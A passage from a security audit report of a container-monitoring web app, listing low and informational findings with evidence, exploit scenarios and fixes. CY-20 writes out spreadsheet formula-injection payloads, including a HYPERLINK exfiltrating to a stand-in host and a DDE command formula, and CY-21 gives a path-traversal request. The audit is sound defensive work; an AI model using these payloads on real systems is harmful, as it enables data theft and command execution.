[INFRA-006] if (u.protocol !== "http:" && u.protocol !== "https:") return false;
...
headers: { Authorization: `Bearer ${token}`, ... }
.env.example: "logs":{"type":"pideck-agent","url":"http://10.0.0.10:5016","tokenEnv":...}, "cadvisorUrl":"http://10.0.0.10:8080"
```

**Exploit scenario.** 1. Operator follows the documented example and configures logs.url as http://<agent>:5016. 2. An attacker on any network segment between ContainerYard and the agent (shared LAN, compromised router, cloud VPC neighbour) sniffs a single list/tail request. 3. They recover the CY_HOSTLOG_TOKEN_* bearer token and can read the remote host's logs directly from the agent, and also read the log content in transit.

**Fix.** Warn at startup when a logs.url is http: on a non-loopback host (opt-in env to silence), and change the .env.example examples to https://.

**Status:** Fixed in d45a0ff (partial: Startup warning plus docs. Plain http stays accepted for private tunnels.)

### [LOW] CY-16 — Login and global rate limits are keyed per IP only (trust proxy = 1, full IPv6 address, no per-account limit, real-IP restoration behind a CDN undocumented)

- **Location:** `server/src/index.ts:44`; `server/src/middleware/auth.ts:35-48`; `server/src/services/audit.ts:35`; `DEPLOYMENT.md:137-153`; `server/src/index.ts:44, 94`; `server/src/middleware/auth.ts:42-48`; `DEPLOYMENT.md:137-152`; `server/src/middleware/auth.ts:42-56`; `server/src/routes/auth.ts:66-82`
- **CWE / OWASP:** CWE-348 / A04:2021 · **Confidence:** likely · **Layer:** infra
- **Merged from:** INFRA-001, API-007, AUTHN-002
- **Verifier:** downgraded from medium — Confirmed: index.ts:44 trust proxy 1; auth.ts:42-48 loginRateLimiter uses the default req.ip key; express-rate-limit is 7.5.1 (no ipv6Subnet), so each IPv6 address gets its own 10/15 min budget; there is no per-account counter. DEPLOYMENT.md's nginx block has no set_real_ip_from/real_ip_header, so a CDN-fronted deployment that follows the docs collapses req.ip to edge IPs (shared lockout, wrong audit IPs). Downgraded: XFF cannot be spoofed through the documented proxy chain, a deployment that restores the client IP at the proxy is not affected by the collapse, and brute force against bcrypt-12 with a 12-char minimum password is not practical at these rates; the residual risks are lockout DoS and diluted audit IPs.
- **Preconditions:** A CDN or second proxy in front of the documented nginx without real_ip / CF-Connecting-IP handling (the production nginx config itself was out of scope and not inspected).

**Evidence**

```
index.ts: app.set("trust proxy", 1);
auth.ts: loginRateLimiter = rateLimit({ windowMs: 15*60*1000, max: 10, ... })  // default keyGenerator = req.ip
DEPLOYMENT.md nginx: proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;  (no set_real_ip_from / real_ip_header for a CDN)
--- merged evidence ---
[API-007] app.set("trust proxy", 1);
loginRateLimiter = rateLimit({ windowMs: 15*60*1000, max: 10, ... })  // default keyGenerator = req.ip
// DEPLOYMENT.md: proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
[AUTHN-002] app.set("trust proxy", 1);
...
export const loginRateLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10, standardHeaders: "draft-7", legacyHeaders: false, ... }); // default keyGenerator = req.ip, express-rate-limit 7.5.1 (no ipv6Subnet)
// nginx doc: proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
```

**Exploit scenario.** Deployment is client -> CDN -> nginx -> app. Without real_ip configured, nginx's $remote_addr is the CDN edge, so X-Forwarded-For arrives as "<client>, <edge>" and with one trusted hop Express takes the right-most entry: req.ip = CDN edge IP. 1. Attacker sends 10 bad logins via the CDN; every legitimate user (including the ADMIN) routed through the same edge is now blocked from /api/auth/login for 15 minutes; repeating every 15 min is a persistent login DoS. 2. The anonymous global limiter (1000 / 15 min) is likewise shared per edge, so one scraper can 429 the login page for a whole region. 3. AuditLog.ip records CDN edges, defeating incident forensics. Conversely, brute force distributed across many edges gets 10 attempts per edge rather than per attacker.

**Fix.** Add a per-account (normalised email) login limiter, key IPv6 by /64 in a custom keyGenerator, and document real_ip restoration for CDN deployments in DEPLOYMENT.md.

**Status:** Fixed in c15c8fb (partial: IPv6 /64 buckets and CDN real-IP docs. A per-account limiter is deferred (lockout trade-off, section 8).)

### [LOW] CY-17 — NODE_ENV defaults to development, which starts the Vite dev middleware (allowedHosts: true) and verbose 5xx errors

- **Location:** `server/src/config/env.ts:10`; `server/src/index.ts:185-186, 220-223`; `server/vite.ts:21-31`
- **CWE / OWASP:** CWE-1188 / A05:2021 · **Confidence:** confirmed · **Layer:** infra
- **Merged from:** INFRA-005
- **Preconditions:** Custom launch without NODE_ENV on a checkout with devDependencies.

**Evidence**

```
NODE_ENV: z.enum(["development", "test", "production"]).default("development"),
if (app.get("env") === "development") { await setupVite(app, httpServer); }
const serverOptions = { middlewareMode: true, hmr: { server }, allowedHosts: true as const };
```

**Exploit scenario.** Docker image (ENV NODE_ENV=production), compose, `npm start` and the PM2 file all set production, so shipped paths are safe. If an operator runs `node -r dotenv/config dist/index.js` (e.g. a custom systemd unit) with a .env lacking NODE_ENV, the server fails open into dev mode on a bare-metal checkout where devDependencies are installed: Vite dev server with allowedHosts:true (DNS-rebinding protection off) serves source files and transforms under the project root, HMR websocket is exposed, and 5xx messages are returned verbatim (internal paths/upstream URLs).

**Fix.** Default NODE_ENV to production in env.ts (dev script already sets development explicitly).

**Status:** Deferred — needs decision: Changing the NODE_ENV default to production changes behaviour for anyone running dist/index.js without NODE_ENV; the Docker image and npm start already set it.

### [LOW] CY-18 — Server always listens on 0.0.0.0; in legacy PM2 mode the plain-HTTP port is directly reachable and X-Forwarded-For is spoofable

- **Location:** `server/src/index.ts:253-258`; `server/src/index.ts:44`; `ecosystem.config.cjs:17-32`; `DEPLOYMENT.md:239-250`
- **CWE / OWASP:** CWE-290 / A07:2021 · **Confidence:** likely · **Layer:** infra
- **Merged from:** INFRA-002
- **Verifier:** downgraded from medium — Confirmed index.ts:253-258 hard-codes host 0.0.0.0 and trust proxy 1 trusts the immediate peer, so a direct client sets req.ip via XFF (rate-limit bypass, forged audit IPs). Downgraded: Docker mode (the documented primary path) publishes only on 127.0.0.1; exposure needs the legacy PM2 path plus a host without a firewall, and the session cookie is Secure so it is not sent over the direct HTTP hop.
- **Preconditions:** Bare-metal/PM2 deployment (or CY_BIND=0.0.0.0) without a host firewall restricting port 5008 to loopback.

**Evidence**

```
httpServer.listen({ port, host: "0.0.0.0", reusePort: true }, ...)
app.set("trust proxy", 1);
ecosystem.config.cjs: script: "npm", args: "run start", env: { NODE_ENV: "production", PORT: "5008" }  (no bind address option exists)
```

**Exploit scenario.** Docker mode is safe (port published on 127.0.0.1). In the documented legacy PM2 mode the process binds every host interface. 1. An attacker on the same LAN/VPC (or the internet if the host has a public IP and no firewall) connects to http://<host>:5008 directly, bypassing the TLS proxy. 2. Because trust proxy=1 trusts the immediate peer, the attacker sets `X-Forwarded-For: <random>` per request, so each login attempt gets a fresh req.ip bucket: the 10/15-min loginRateLimiter and global limiter no longer apply, enabling unlimited online password guessing against ADMIN accounts (bcrypt cost 12 is the only brake). 3. `X-Forwarded-Proto: https` makes Express issue the Secure session cookie over plaintext HTTP, so any credentials/cookies on that path are sniffable. The same applies if a Docker operator sets CY_BIND=0.0.0.0.

**Fix.** Add a BIND_HOST env (default 0.0.0.0 for the container image, 127.0.0.1 in ecosystem.config.cjs) and pass it to listen().

**Status:** Fixed in 7913cf3

### [LOW] CY-19 — docker-deploy.sh writes SQLite backups (password hashes) with default permissions and no retention

- **Location:** `scripts/docker-deploy.sh:139-149`; `DEPLOYMENT.md:113-120`
- **CWE / OWASP:** CWE-276 / A05:2021 · **Confidence:** likely · **Layer:** infra
- **Merged from:** INFRA-008
- **Preconditions:** Other local users on the deploy host and a traversable home directory.

**Evidence**

```
BACKUP_DIR="$HOME/backups/containeryard"
run mkdir -p "$BACKUP_DIR"
run docker run --rm -v "${DATA_VOL}:/data:ro" -v "${BACKUP_DIR}:/backup" --entrypoint /bin/cp "$IMAGE" -a /data/app.db "/backup/app.db.bak-${TS}"
```

**Exploit scenario.** mkdir -p uses the caller's umask (typically 0755) and `cp -a` preserves app.db's mode (SQLite creates 0644), so each deploy leaves a world-readable copy of the User table (emails, bcrypt hashes, sessionVersion) and AuditLog in ~/backups/containeryard. On a multi-user host where $HOME is traversable (0755, the default on many distros before 24.04), any local user copies the backups and cracks ADMIN hashes offline. Backups also accumulate forever. The live DB is copied while the app is running (no `.backup` / WAL-safe snapshot), so a backup can be torn.

**Fix.** mkdir -m 700 the backup dir, chmod 600 each backup, and prune backups older than N days (with dry-run support).

**Status:** Fixed in 9295c21 (partial: Owner-only permissions. Automatic pruning of old backups is deferred (it deletes data).)

### [LOW] CY-20 — Remote-supplied container names reach CSV exports without formula neutralisation (and webhook text unescaped)

- **Location:** `server/src/routes/metrics.ts:12-17`; `server/src/routes/metrics.ts:248-263`; `server/src/services/cadvisor.ts:110-118`; `server/src/routes/metrics.ts:12-17, 248-251`; `server/src/services/alertWorker.ts:298-313`
- **CWE / OWASP:** CWE-1236 / A03:2021 · **Confidence:** possible · **Layer:** injection
- **Merged from:** INJECTION-003, LOGIC-005
- **Preconditions:** Attacker controls the JSON returned by a configured cAdvisor endpoint; a user opens the CSV in a spreadsheet application.

**Evidence**

```
function escapeCsvField(value: string): string {
  if (/[",\n\r]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}
...
escapeCsvField(metric.containerName),
--- merged evidence ---
[LOGIC-005] if (alias) return alias.replace(/^\/?docker\//, "").replace(/^\//, "");
function escapeCsvField(value) { if (/[",\n\r]/.test(value)) return `"${value.replace(/"/g,'""')}"`; return value; } // no =,+,-,@ handling
return `Alert: ${rule.name} - Container ${container.name} ${rule.conditionType} is ...`
```

**Exploit scenario.** 1. containerName is persisted by metricsAggregator from listContainers(); for CADVISOR_ONLY hosts it is taken from the remote cAdvisor 'aliases' JSON (cadvisorDisplayName).
2. A compromised or spoofed cAdvisor endpoint (or remote host) returns an alias such as `=HYPERLINK("https://evil.example/?"&A1,"click")` or `=cmd|' /C calc'!A0`.
3. An admin exports /api/hosts/<host>/metrics/export/csv and opens it in Excel/LibreOffice; the cell is evaluated as a formula (data exfiltration via HYPERLINK/WEBSERVICE or DDE prompt).
Docker-sourced names cannot start with = + - @ (daemon enforces [a-zA-Z0-9][a-zA-Z0-9_.-]+), so the practical path is limited to an untrusted cAdvisor source.

**Fix.** Prefix fields starting with = + - @ TAB CR with a single quote in escapeCsvField, and restrict cAdvisor-derived names to the Docker name charset.

**Status:** Fixed in 58b7792 (partial: Formula prefixes neutralised. Restricting cAdvisor-derived names to the Docker name charset is a follow-up.)

### [LOW] CY-21 — cAdvisor container-path check is only end-anchored: '..', '?' and '#' in :containerId reach other GET paths on the cAdvisor origin

- **Location:** `server/src/services/cadvisor.ts:83-85`; `server/src/services/cadvisor.ts:143-149`; `server/src/services/cadvisor.ts:228-238`; `server/src/services/cadvisor.ts:332-366`; `server/src/routes/inspect.ts:65-80`; `server/src/routes/hosts.ts:76-112`
- **CWE / OWASP:** CWE-22 / A01:2021 · **Confidence:** confirmed · **Layer:** injection
- **Merged from:** INJECTION-001
- **Verifier:** downgraded from medium — Confirmed by probe (verify/cad.mjs): '/../../../../other/app?x=/docker/<64 hex>' passes isDockerContainerPath and WHATWG URL normalisation turns `${base}/api/v1.3/containers${id}` into `${origin}/other/app?x=...` (also climbs out of a path-prefixed cadvisorUrl). Reachable by VIEWER via /containers/:id, /stats and /inspect on CADVISOR_ONLY hosts. Downgraded: the request is GET-only, goes only to the operator-configured cAdvisor origin, carries no credentials, and the response is reduced to a few typed fields (id/name/aliases/spec.image/spec.labels or stats numbers); a non-JSON body leaks at most ~10 characters via the inspect route's 502 parse-error message. Meaningful only if that origin hosts other sensitive JSON endpoints.
- **Preconditions:** At least one CADVISOR_ONLY remote host configured (CY_REMOTE_HOSTS). Attacker holds any valid account (VIEWER). Requests stay on the configured cAdvisor scheme/host/port (origin cannot be changed); GET only.

**Evidence**

```
export function isDockerContainerPath(name: string): boolean {
  return /\/docker[-/][0-9a-f]{64}(?:\.scope)?$/i.test(name);   // no ^ anchor, no '..'/'?'/'#' check
}
...
const container = await this.fetchJson<CadvisorContainer>(`/api/v1.3/containers${containerId}`);
// inspect.ts
const resp = await fetch(`${base}/api/v1.3/containers${id}`, ...);
return res.json({ provider: "CADVISOR_ONLY", spec: cadvisorInspectSpec(data, id) });
```

**Exploit scenario.** 1. Any signed-in user (VIEWER is enough; the routes use requireAuth only) picks a CADVISOR_ONLY host id from GET /api/hosts.
2. They request GET /api/hosts/<host>/containers/<encodeURIComponent('/../../../../<any/path>?x=/docker/' + 'a'*64)>/inspect (or .../containers/<same> or .../containers/<same>/stats).
3. Express 5 decodes %2F/%3F in the param, so containerId = '/../../../../<any/path>?x=/docker/aaaa...'. The regex only checks the tail, so it passes.
4. The URL becomes `${cadvisorBase}/api/v1.3/containers/../../../../<any/path>?x=/docker/...`; WHATWG URL normalisation removes the dot segments (probe: http://cadvisor.example:8080/prefix + payload -> http://cadvisor.example:8080/other/path?x=/docker/...). Any base-path prefix in the configured cAdvisor URL (e.g. cAdvisor published under a sub-path of a reverse proxy) is escaped as well; '#' instead of '?' truncates the remainder.
5. The server sends a GET from the ContainerYard host to an attacker-chosen path on that origin. inspect.ts reflects id, name, aliases[0], spec.image and the whole spec.labels object of any JSON response, and non-OK statuses are distinguishable (404 vs 502 vs 504), so the caller can enumerate and partly read other endpoints on the cAdvisor host or on the proxy that fronts it, which the browser user normally cannot reach (cAdvisor endpoints are typically LAN/VPN-only).

**Fix.** Anchor the check: /^(\/docker\/[0-9a-f]{64}|\/system\.slice\/docker-[0-9a-f]{64}\.scope)$/i (also in inspect.ts), and build the URL with encodeURI-safe segments.

**Status:** Fixed in 7c58ad1

### [LOW] CY-22 — Monitoring tables have no retention: ContainerMetricsHourly and AlertHistory grow forever

- **Location:** `server/prisma/schema.prisma:100-138`; `server/src/index.ts:269-287`; `server/src/services/metricsAggregator.ts:182-200`
- **CWE / OWASP:** CWE-779 / A04:2021 · **Confidence:** confirmed · **Layer:** logging
- **Merged from:** LOGGING-002
- **Preconditions:** Long-running deployment.

**Evidence**

```
/// Hourly aggregated container resource metrics (90-day trend history)
model ContainerMetricsHourly { ... }
// index.ts schedules only restartTracker.cleanupOldRestarts() and pruneAudit(); no deleteMany on containerMetricsHourly or alertHistory anywhere in server/src (alerts.ts DELETE /history is manual only).
```

**Exploit scenario.** The schema documents a 90-day window, but nothing deletes old rows. Over time the SQLite file on the data volume grows without bound, and every unbounded findMany (API-003) gets slower and larger; container names and alert messages are retained indefinitely, unlike the 180-day audit log policy.

**Fix.** Add a daily prune for ContainerMetricsHourly (90 d) and AlertHistory (configurable) next to pruneAudit in index.ts.

**Status:** Fixed in f57b721 (partial: Hourly metrics pruned at 90 days. Alert history pruning is opt-in (ALERT_HISTORY_RETENTION_DAYS) so no data is deleted without a decision.)

### [LOW] CY-23 — No audit trail for alert channel/rule changes, channel tests, acknowledgements or DELETE /api/alerts/history

- **Location:** `server/src/routes/alerts.ts:75-388`; `server/src/routes/alerts.ts:347-370`; `server/src/routes/alerts.ts:76-190`; `server/src/routes/alerts.ts:374-389`
- **CWE / OWASP:** CWE-778 / A09:2021 · **Confidence:** confirmed · **Layer:** logging
- **Merged from:** LOGGING-001, AUTHZ-005
- **Verifier:** downgraded from medium — Confirmed: no recordAudit call anywhere in alerts.ts while container/stack/user/login actions are audited. Downgraded: every affected route already requires ADMIN plus CSRF; the impact is repudiation and loss of forensic trail after an ADMIN compromise, not a privilege gain. (AUTHZ-005's audit half is merged here; its acknowledgedBy half is in the acknowledgedBy finding.)
- **Preconditions:** ADMIN session (legitimate insider or stolen).

**Evidence**

```
grep recordAudit server/src/routes/alerts.ts -> no matches
router.delete("/history", ... const { count } = await prisma.alertHistory.deleteMany({ where: { createdAt: { lt: cutoff } } });
--- merged evidence ---
[AUTHZ-005] const acknowledgedBy =
  typeof req.body?.acknowledgedBy === "string" && req.body.acknowledgedBy.trim()
    ? req.body.acknowledgedBy.trim()
    : "system";
await prisma.alertHistory.update({ where: { id }, data: { acknowledgedAt: new Date(), acknowledgedBy } });
// no recordAudit() anywhere in alerts.ts (channels/rules CRUD, test send, history delete)
```

**Exploit scenario.** 1) An attacker with a hijacked ADMIN session PATCHes a webhook channel URL to an attacker host (container names and alert text now flow out), disables alert rules (`enabled:'false'`) before stopping containers, then calls DELETE /api/alerts/history?days=1 to erase earlier alert evidence. 2) None of this lands in AuditLog, while container/stack actions, logins and user admin are audited (README advertises a 'full audit log'). 3) Incident responders cannot tell who changed alerting or when evidence was deleted.

**Fix.** Call recordAudit for channel/rule create/update/delete/test, acknowledge and history delete (target = id/name, detail without config secrets).

**Status:** Fixed in 3795829

### [LOW] CY-24 — cAdvisor base URLs logged verbatim (credentials leak if URL carries userinfo)

- **Location:** `server/src/services/cadvisor.ts:277, 286, 389`; `server/src/config/hosts.ts:38-39`
- **CWE / OWASP:** CWE-532 / A09:2021 · **Confidence:** possible · **Layer:** logging
- **Merged from:** LOGGING-003
- **Preconditions:** Operator embeds credentials in the cAdvisor URL (not documented either way).

**Evidence**

```
console.log(`[cAdvisor] Found working endpoint: ${endpoint} for ${this.baseUrl}`);
console.warn(`[cAdvisor] No working endpoint found for ${this.baseUrl}. Tried: ${errors.join(', ')}`);
console.warn(`Host ${host.id} has invalid cAdvisor URL: ${cadvisorBase}`);
```

**Exploit scenario.** An operator protects a remote cAdvisor with basic auth and sets CY_REMOTE_HOSTS cadvisorUrl=https://user:****@host:8080. Every startup and every failed probe writes the full URL including the password to stdout, where it ends up in docker logs, log shippers and the app's own host-log viewer (admins) - and in daily log-digest mails.

**Fix.** Log new URL(base).origin with username/password stripped (or reject userinfo in cadvisorUrl like logs.url already does).

**Status:** Fixed in 7bd5e84

### [LOW] CY-25 — Alert acknowledgement trusts client-supplied, unbounded `acknowledgedBy` and can be overwritten

- **Location:** `server/src/routes/alerts.ts:347-372`; `server/src/routes/alerts.ts:349-371`; `server/src/routes/alerts.ts:347-370`; `server/src/routes/alerts.ts:76-190`; `server/src/routes/alerts.ts:374-389`
- **CWE / OWASP:** CWE-345 / A04:2021 · **Confidence:** confirmed · **Layer:** logic
- **Merged from:** LOGIC-004, INJECTION-004, AUTHZ-005
- **Preconditions:** ADMIN session.

**Evidence**

```
const acknowledgedBy = typeof req.body?.acknowledgedBy === "string" && req.body.acknowledgedBy.trim() ? req.body.acknowledgedBy.trim() : "system";
await prisma.alertHistory.update({ where: { id }, data: { acknowledgedAt: new Date(), acknowledgedBy } });
--- merged evidence ---
[INJECTION-004] const acknowledgedBy =
  typeof req.body?.acknowledgedBy === "string" && req.body.acknowledgedBy.trim()
    ? req.body.acknowledgedBy.trim()
    : "system";
... data: { acknowledgedAt: new Date(), acknowledgedBy }
[AUTHZ-005] const acknowledgedBy =
  typeof req.body?.acknowledgedBy === "string" && req.body.acknowledgedBy.trim()
    ? req.body.acknowledgedBy.trim()
    : "system";
await prisma.alertHistory.update({ where: { id }, data: { acknowledgedAt: new Date(), acknowledgedBy } });
// no recordAudit() anywhere in alerts.ts (channels/rules CRUD, test send, history delete)
```

**Exploit scenario.** An ADMIN acknowledges a critical alert with body {acknowledgedBy:'other-admin@example.com'}: the record attributes the ack to someone else (unbounded string, no length cap). Acknowledging an already-acknowledged alert overwrites the original time and person, so the first responder's record can be rewritten. Combined with LOGGING-001 there is no independent trail.

**Fix.** Set acknowledgedBy from req.session.user.email, ignore the body field, and refuse (409) if acknowledgedAt is already set.

**Status:** Fixed in 7207e99

### [LOW] CY-26 — Database password committed to public git history in removed handoff docs (ROTATE REQUIRED if still in use)

- **Location:** `claude-handoff.md (added in 8de038a, deleted in f662dcc, 2025-10-17; reachable in history):31, 49, 205, 409, 431`
- **CWE / OWASP:** CWE-798 / A07:2021 · **Confidence:** confirmed · **Layer:** secrets
- **Merged from:** SECRETS-003
- **Preconditions:** The same password is still configured on some reachable PostgreSQL server or reused for another account.

**Evidence**

```
**Database:** `postgresql://containeryard:cont****2025@localhost:5432/containeryard`
- POSTGRES_PASSWORD=cont****2025
```

**Exploit scenario.** 1. Anyone clones the public repo and runs `git log --all -p -S <string>` (or uses a history scanner). 2. They recover the PostgreSQL user `containeryard` and its password. 3. If that password is still set on any PostgreSQL instance (or reused elsewhere) that is reachable by the attacker, they get read/write access to it. Current HEAD no longer uses PostgreSQL (SQLite + Prisma since v5.6.0), so the live app is not directly affected. gitleaks missed it because the value is a low-entropy passphrase inside a URL in a Markdown file.

**Fix.** Rotate/retire that PostgreSQL password wherever it still exists; history rewrite is optional and does not remove existing clones.

**Status:** Manual action: ROTATE REQUIRED: the historic PostgreSQL password is in public git history. Retire or rotate it wherever it may still be set, and check it is not reused anywhere.

### [LOW] CY-27 — App-level HSTS off by default and no Permissions-Policy header

- **Location:** `server/src/lib/csp.ts:69-78`
- **CWE / OWASP:** CWE-319 / A05:2021 · **Confidence:** confirmed · **Layer:** web
- **Merged from:** WEB-003
- **Preconditions:** Proxy/CDN does not set Strict-Transport-Security; victim reaches the site over http first.

**Evidence**

```
strictTransportSecurity: env.CY_ENABLE_APP_HSTS === "1",
referrerPolicy: { policy: "strict-origin-when-cross-origin" },
contentSecurityPolicy: buildCsp(env),
```

**Exploit scenario.** If the reverse proxy/CDN in front does not add HSTS, a user who types the hostname or follows an http:// link on a hostile network can be SSL-stripped on first visit; the secure cookie is not sent over http, but the attacker can serve a fake login page and harvest admin credentials. Whether this is exploitable depends on the proxy config, which is outside the repo.

**Fix.** Enable HSTS by default when NODE_ENV=production (opt-out env), add a minimal Permissions-Policy, and add the header to the nginx example.

**Status:** Fixed in 43ad33b (partial: Permissions-Policy added and HSTS documented at the proxy. App-level HSTS stays opt-in to avoid a duplicate header.)

### [INFO] CY-28 — Alert channel/rule schemas accept free-form strings and unbounded values

- **Location:** `shared/schema.ts:130-158`; `server/src/routes/alerts.ts:13-14`
- **CWE / OWASP:** CWE-20 / A04:2021 · **Confidence:** confirmed · **Layer:** api
- **Merged from:** API-005
- **Verifier:** downgraded from low — Confirmed free-form type/operator/enabled/threshold/containerFilter strings in shared/schema.ts. Downgraded: ADMIN-only input; effect is silently broken or over-broad alert rules (integrity of the ADMIN's own config), no privilege or data exposure.
- **Preconditions:** ADMIN session.

**Evidence**

```
type: z.string().min(1).max(50), config: z.string().min(1), enabled: z.string().max(10).optional()
conditionType: z.string().min(1).max(50), operator: z.string().min(1).max(10), threshold: z.string().min(1).max(255),
durationMinutes: z.number().int().min(0).optional(), containerFilter: z.string().nullable().optional(), description: z.string().nullable().optional()
```

**Exploit scenario.** 1) ADMIN (or a script with a stolen admin session) stores type='slack', operator='=>', enabled='yes', threshold='abc' or containerFilter='not json': all accepted, then silently never fire or (containerFilter invalid JSON) match ALL containers because filterContainersByRule falls back to `return containers` in its catch. 2) config/description up to the 1 MB body limit are stored and re-sent on every list call. 3) durationMinutes=1e15 is accepted. Result: rules that look configured but never alert, or alert on every container - a monitoring blind spot / noise generator. Not a privilege issue.

**Fix.** Use z.enum for type/operator/conditionType/enabled, z.number for threshold, validate containerFilter as JSON with a size cap.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-29 — Channel test endpoint: unthrottled outbound POSTs and raw network error text returned

- **Location:** `server/src/routes/alerts.ts:164-193`; `server/src/lib/safeWebhook.ts:221-242, 272-295`
- **CWE / OWASP:** CWE-209 / A04:2021 · **Confidence:** confirmed · **Layer:** api
- **Merged from:** API-004
- **Verifier:** downgraded from low — Confirmed no actionRateLimiter on POST /channels/:id/test and raw error text in `details`. Downgraded: ADMIN-only and CSRF-protected; the SSRF guard (connect-time lookup, no redirects) still applies, and the error text describes a URL the same ADMIN configured.
- **Preconditions:** ADMIN session.

**Evidence**

```
await sendNotification(channel, testMessage);
} catch (error) { res.status(500).json({ error: "Failed to send test notification", details: errorMessage(error) }); }
```

**Exploit scenario.** 1) An ADMIN session (or an attacker who stole one, or CSRF-less automation) creates a webhook channel to host:port and calls POST /channels/:id/test repeatedly. 2) No action rate limiter is mounted on this route, so the server issues up to ~10000 POSTs/15 min to any external target (request cannon from the server's IP). 3) `details` returns raw errors such as `connect ECONNREFUSED <ip>:<port>`, `Webhook timed out`, or `<host> resolves to address <ip> is private`, which turns the endpoint into a DNS-resolution and (with WEBHOOK_ALLOW_PRIVATE=true, common in homelabs) an internal port-scan oracle.

**Fix.** Mount actionRateLimiter on the test route and return a generic error class instead of the raw message.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-30 — Session cookie SameSite defaults to None in code although the SPA is same-origin

- **Location:** `server/src/config/env.ts:16`; `server/src/config/session.ts:33-40`; `server/src/middleware/csrf.ts:38-67`; `server/src/middleware/csrf.ts:38-68`
- **CWE / OWASP:** CWE-1275 / A05:2021 · **Confidence:** confirmed · **Layer:** authn
- **Merged from:** AUTHN-003, WEB-002
- **Verifier:** downgraded from low — env.ts:16 default is 'none', but .env.example (the documented template) sets COOKIE_SAMESITE=lax, and every mutating /api request requires the session-bound x-csrf-token plus an Origin check (csrf.ts). No working exploit; residual is defence in depth for cross-site GETs and future routes.
- **Preconditions:** Victim admin logged in and visiting an attacker page; impact limited by CSRF token + CORS.

**Evidence**

```
COOKIE_SAMESITE: z.enum(["lax", "strict", "none"]).default("none"),
...
cookie: { httpOnly: true, sameSite: env.COOKIE_SAMESITE, secure: true, ... maxAge: 7 * 24 * 60 * 60 * 1000 }
--- merged evidence ---
[WEB-002] COOKIE_SAMESITE: z.enum(["lax", "strict", "none"]).default("none"),
...
cookie: { httpOnly: true, sameSite: env.COOKIE_SAMESITE, secure: true, ... }
...
if (typeof origin !== "string" || !origin) return true;
```

**Exploit scenario.** Mutations are protected by a session-bound synchronizer token plus an Origin check (verifyCsrf), so classic CSRF is blocked today. With SameSite=None, however, the admin's session cookie is attached to every cross-site request: any cross-site GET (image/script/iframe/fetch no-cors) to /api/* runs authenticated, which enables XS-Leak style probing (e.g. timing or error-oracle on /api/hosts/<id>/containers/<name> to learn which containers exist) and means one future bug in CSRF coverage (a new state-changing GET, or a route mounted outside /api such as the root-mounted inspectRouter) becomes exploitable immediately. Defence in depth is lost for no functional gain, because the client and API share one origin in the documented deployment.

**Fix.** Change the code default to 'lax'; keep 'none' available for split-origin setups.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-31 — Sessions have a fixed 7-day lifetime with no idle timeout and no 'sign out everywhere'

- **Location:** `server/src/config/session.ts:33-40`; `server/src/routes/auth.ts:348-361`
- **CWE / OWASP:** CWE-613 / A07:2021 · **Confidence:** confirmed · **Layer:** authn
- **Merged from:** AUTHN-006
- **Preconditions:** Session token theft or unattended browser.

**Evidence**

```
maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days  (no rolling, no idle expiry)
router.post("/logout", requireAuth, (req, res, next) => { req.session.destroy(...) })
```

**Exploit scenario.** A stolen or left-open ADMIN session stays valid for 7 days regardless of inactivity. Logout destroys only the current server-side session (correct), but there is no user-facing way to revoke other sessions short of changing the password (which bumps sessionVersion). Google sessions are not re-checked against Firebase revocation after login (only the allowlist is). No direct exploit path on its own.

**Fix.** Add an idle timeout (rolling with shorter maxAge) and a 'sign out everywhere' action that bumps sessionVersion.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-32 — ADMIN-only container log download is not a real boundary: VIEWER reads the same unredacted container logs via /containers/:id/logs, SSE stream and stack logs

- **Location:** `server/src/routes/logDownload.ts:43-75`; `server/src/routes/hosts.ts:133-181`; `server/src/routes/hosts.ts:183-275`; `server/src/routes/stacks.ts:144-209`
- **CWE / OWASP:** CWE-863 / A01:2021 · **Confidence:** confirmed · **Layer:** authz
- **Merged from:** AUTHZ-004
- **Verifier:** downgraded from low — Confirmed that VIEWER can read the same container logs through /logs, the SSE stream and stack logs while /api/logs/download?scope=container is ADMIN-only. Downgraded: reading container logs is the product's core read-only feature for VIEWER; the ADMIN gate on download is an inconsistency, not a bypass of an intended boundary.
- **Preconditions:** Valid VIEWER account.

**Evidence**

```
logDownload.ts: router.get("/", requireRole("ADMIN"), ...) -> scope=container -> getContainerLogs(host, containerId, { tail: up to 10000 })
hosts.ts:  router.get("/:hostId/containers/:containerId/logs", requireAuth, ...) -> getContainerLogs(..., { tail: Math.min(tail, 5000) })
hosts.ts:  router.get("/:hostId/containers/:containerId/logs/stream", requireAuth, ...) // live follow
stacks.ts: router.get("/:hostId/stacks/:name/logs", ...)  // mounted with requireAuth only
```

**Exploit scenario.** 1. VIEWER is denied GET /api/logs/download?scope=container&hostId=h&containerId=c (403). 2. VIEWER calls GET /api/hosts/h/containers/c/logs?tail=5000 or opens the SSE stream and receives the same container output, including any secrets applications print (tokens, connection strings, ContainerYard's own container logs). Host logs are ADMIN-only and redacted, container logs have neither. The role check on the download route gives a false sense of restriction.

**Fix.** Decide whether VIEWER may read container logs; either allow scope=container downloads for VIEWER or gate all container-log routes behind ADMIN/an opt-in.

**Status:** Not fixed (info): reported as a recommendation, see section 8.

### [INFO] CY-33 — Repository Actions settings allow any action and do not enforce SHA pinning; no CODEOWNERS for workflow files

- **Location:** `.github/workflows/ci.yml:32-153`; `.github/workflows/release.yml:73-244`
- **CWE / OWASP:** CWE-1357 / A08:2021 · **Confidence:** confirmed · **Layer:** cicd
- **Merged from:** CICD-005
- **Preconditions:** Future workflow change introducing an unpinned action.

**Evidence**

```
GitHub API (read-only): /actions/permissions -> {"allowed_actions":"all","sha_pinning_required":false}. All `uses:` in both workflows are already pinned to full commit SHAs with version comments (e.g. actions/checkout@3d3c42e5... # v7.0.1). No CODEOWNERS file; protect-main requires 0 approvals.
```

**Exploit scenario.** No current exploit: every action is SHA-pinned today. A future edit (or Dependabot-unrelated hand edit) could add a tag-pinned third-party action and nothing would block it; a moved tag on that action would then run attacker code in the publish job.

